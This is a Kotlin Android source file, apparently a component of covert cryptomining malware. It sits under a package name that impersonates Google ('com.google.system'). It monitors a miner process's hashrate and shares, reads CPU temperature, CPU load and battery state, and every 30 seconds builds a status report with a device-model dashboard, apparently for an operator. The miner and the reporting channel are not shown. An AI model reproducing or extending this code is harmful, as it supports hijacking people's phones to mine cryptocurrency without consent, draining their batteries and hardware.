package com.google.system

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

class MiningMonitor(
    private val context: Context,
    private val onStatusReport: ((MiningStats) -> Unit)? = null
) {
    data class MiningStats(
        val isMining: Boolean,
        val hashrate: Double,
        val hashrateUnit: String,
        val sharesAccepted: Long,
        val sharesRejected: Long,
        val uptime: Long,
        val temperature: Float,
        val batteryLevel: Int,
        val isCharging: Boolean,
        val cpuUsage: Float,
        val poolName: String,
        val threads: Int,
        val deviceModel: String
    )

    private var monitorJob: Job? = null
    @Volatile private var isMonitoring = false
    private var miningStartTime: Long = 0
    @Volatile private var currentHashrate: Double = 0.0
    @Volatile private var sharesAccepted: Long = 0
    @Volatile private var sharesRejected: Long = 0
    private var lastReportTime: Long = 0
    private val monitorLock = Any()

    private val hashrateRegex = Regex("(\\d+\\.?\\d*)\\s*(H/s|kH/s|MH/s|GH/s|TH/s)")

    fun startMonitoring(minerProcess: Process? = null, poolName: String = "Unknown", threads: Int = 2) {
        synchronized(monitorLock) {
            if (isMonitoring) return
            isMonitoring = true
            miningStartTime = System.currentTimeMillis()
            lastReportTime = System.currentTimeMillis()
        }

        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        monitorJob = scope.launch {
            while (isActive) {
                delay(30000)
                val stats = collectStats(minerProcess, poolName, threads)
                onStatusReport?.invoke(stats)
                lastReportTime = System.currentTimeMillis()
            }
        }
    }

    fun stopMonitoring() {
        synchronized(monitorLock) { isMonitoring = false }
        monitorJob?.cancel()
        monitorJob = null
    }

    private fun collectStats(minerProcess: Process?, poolName: String, threads: Int): MiningStats {
        val miningNow = minerProcess?.isAlive == true
        val temp = getCpuTemperature()
        val battery = getBatteryInfo()
        val cpu = getCpuUsage()

        return MiningStats(
            isMining = miningNow,
            hashrate = currentHashrate,
            hashrateUnit = "H/s",
            sharesAccepted = sharesAccepted,
            sharesRejected = sharesRejected,
            uptime = if (miningStartTime > 0 && miningNow) System.currentTimeMillis() - miningStartTime else 0,
            temperature = temp,
            batteryLevel = battery.level,
            isCharging = battery.isCharging,
            cpuUsage = cpu,
            poolName = poolName,
            threads = threads,
            deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
        )
    }

    fun parseMinerOutput(line: String) {
        // Check accepted first so hashrate parsing doesn't shadow share counting
        if (line.contains("accepted", ignoreCase = true)) {
            sharesAccepted++
        }
        if (line.contains("rejected", ignoreCase = true)) {
            sharesRejected++
        }
        if (line.contains("speed", ignoreCase = true) || line.contains("hashrate", ignoreCase = true)) {
            val match = hashrateRegex.find(line)
            if (match != null) {
                val value = match.groupValues[1].toDoubleOrNull() ?: 0.0
                currentHashrate = when (match.groupValues[2]) {
                    "kH/s" -> value * 1000
                    "MH/s" -> value * 1000000
                    "GH/s" -> value * 1e9
                    "TH/s" -> value * 1e12
                    else -> value
                }
            }
        }
    }

    private fun getCpuTemperature(): Float {
        return try {
            val thermalZones = listOf(
                "/sys/class/thermal/thermal_zone0/temp",
                "/sys/class/thermal/thermal_zone1/temp",
                "/sys/class/thermal/thermal_zone2/temp",
                "/sys/devices/virtual/thermal/thermal_zone0/temp"
            )
            for (zone in thermalZones) {
                val file = File(zone)
                if (file.exists()) {
                    val tempStr = file.readText().trim()
                    val temp = tempStr.toFloatOrNull() ?: continue
                    return if (temp > 1000) temp / 1000f else temp
                }
            }
            0f
        } catch (_: Exception) {
            0f
        }
    }

    private data class BatteryInfo(val level: Int, val isCharging: Boolean)

    private fun getBatteryInfo(): BatteryInfo {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val isCharging = bm.isCharging
            BatteryInfo(level, isCharging)
        } catch (_: Exception) {
            BatteryInfo(-1, false)
        }
    }

    private fun getCpuUsage(): Float {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", "top -n 1 -d 1 2>/dev/null"))
            val output = process.inputStream.bufferedReader().use { reader ->
                var cpuLine = ""
                while (reader.readLine().also { cpuLine = it } != null) {
                    if (cpuLine.contains("cpu", ignoreCase = true)) {
                        val match = Regex("(\\d+)%?\\s*id").find(cpuLine)
                        if (match != null) {
                            val idle = match.groupValues[1].toFloatOrNull() ?: continue
                            return 100f - idle
                        }
                    }
                }
                ""
            }
            process.waitFor()
            process.inputStream.close()
            process.errorStream?.close()
            -1f
        } catch (_: Exception) {
            -1f
        }
    }

    fun formatDashboard(stats: MiningStats): String {
        val hrFormatted = when {
            stats.hashrate >= 1000 -> "${String.format("%.1f", stats.hashrate / 1000)} kH/s"
            else -> "${String.format("%.1f", stats.hashrate)} H/s"
        }

        val uptimeStr = formatUptime(stats.uptime)
        val tempStr = if (stats.temperature > 0) "${String.format("%.1f", stats.temperature)}°C" else "N/A"
        val cpuStr = if (stats.cpuUsage >= 0) "${String.format("%.1f", stats.cpuUsage)}%" else "N/A"
        val batteryStr = "${stats.batteryLevel}% ${if (stats.isCharging) "⚡" else ""}"

        return """
📊 **Mining Dashboard**
━━━━━━━━━━━━━━━━━━━━
⛏️ **Status**: ${if (stats.isMining) "🟢 Mining" else "🔴 Stopped"}
💰 **Pool**: ${stats.poolName}
⚡ **Hashrate**: $hrFormatted
🧵 **Threads**: ${stats.threads}
✅ **Shares**: ${stats.sharesAccepted} accepted | ${stats.sharesRejected} rejected
⏱️ **Uptime**: $uptimeStr
🌡️ **Temp**: $tempStr
💻 **CPU**: $cpuStr
🔋 **Battery**: $batteryStr
📱 **Device**: ${stats.deviceModel}
━━━━━━━━━━━━━━━━━━━━
""".trimIndent()
    }

    private fun formatUptime(ms: Long): String {
        val seconds = ms / 1000
        val minutes = seconds / 60
        val hours = minutes / 60
        val days = hours / 24

        return when {
            days > 0 -> "${days}d ${hours % 24}h"
            hours > 0 -> "${hours}h ${minutes % 60}m"
            minutes > 0 -> "${minutes}m ${seconds % 60}s"
            else -> "${seconds}s"
        }
    }
}
